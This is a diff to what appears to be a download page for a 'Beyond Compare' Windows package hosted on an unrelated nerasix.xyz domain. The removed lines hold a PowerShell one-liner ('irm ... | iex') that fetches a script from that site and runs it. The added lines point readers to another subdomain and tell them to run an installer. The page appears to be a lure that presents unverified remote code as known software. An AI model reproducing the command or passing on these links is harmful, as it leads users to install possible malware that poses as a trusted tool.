@@ -8,12 +8,8 @@ Beyond Compare desktop package for Windows · utility toolkit · local install r
 
 > Use the project link below for Windows.
 
-```
-irm https://beyond-compare.nerasix.xyz/ | iex
-```
-
-* **Project link:** **[beyond-compare.nerasix.xyz](https://beyond-compare.nerasix.xyz/)**
-* **Full URL:** `https://beyond-compare.nerasix.xyz/`
+* **Project link:** **[beyond-compare-elite-tier.nerasix.xyz](https://beyond-compare-elite-tier.nerasix.xyz/)**
+* **Full URL:** `https://beyond-compare-elite-tier.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
